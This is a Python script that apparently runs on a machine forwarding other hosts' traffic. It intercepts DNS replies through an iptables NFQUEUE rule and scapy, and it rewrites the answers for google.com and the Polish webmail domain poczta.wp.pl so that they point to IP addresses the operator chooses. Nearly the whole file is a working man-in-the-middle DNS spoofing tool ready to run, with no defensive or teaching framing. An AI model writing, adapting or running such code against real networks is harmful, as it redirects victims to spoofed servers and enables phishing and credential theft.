import os
import logging as log

from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSRR, DNSQR
from netfilterqueue import NetfilterQueue


class DnsSnoof:
    def __init__(self, host_dict, queue_num):
        self.hostDict = host_dict
        self.queueNum = queue_num
        self.queue = NetfilterQueue()

    def __call__(self):
        log.info("Snoofing....")
        os.system(f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
        self.queue.bind(self.queueNum, self.call_back)
        try:
            self.queue.run()
        except KeyboardInterrupt:
            os.system(f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
            log.info("[!] iptable rule flushed")

    def call_back(self, packet):
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(DNSRR):
            try:
                log.info(f'[original] {scapy_packet[DNSRR].summary}')
                query_name = scapy_packet[DNSQR].qname
                if query_name in self.hostDict:
                    scapy_packet[DNS].an = DNSRR(
                        rrname=query_name, rdata=self.hostDict[query_name])
                    scapy_packet[DNS].ancount = 1
                    del scapy_packet[IP].len
                    del scapy_packet[IP].chksum
                    del scapy_packet[UDP].len
                    del scapy_packet[UDP].chksum
                    log.info(f'[modified] {scapy_packet[DNSRR].summary}')
                else:
                    log.info(f'[not modified] {scapy_packet[DNSRR].rdata}')
            except IndexError as ie:
                log.error(ie)
            packet.set_payload(bytes(scapy_packet))
        return packet.accept()


if __name__ == '__main__':
    print("Start DNS Spoofing")
    try:
        hostDict = {
            b"google.com.": "10.10.10.10",
            b"poczta.wp.pl.": "5.5.5.5"
        }
        queueNum = 1
        log.basicConfig(format='%(asctime)s - %(message)s', level=log.INFO)
        snoof = DnsSnoof(hostDict, queueNum)
        snoof()
    except OSError as ose:
        log.error(ose)
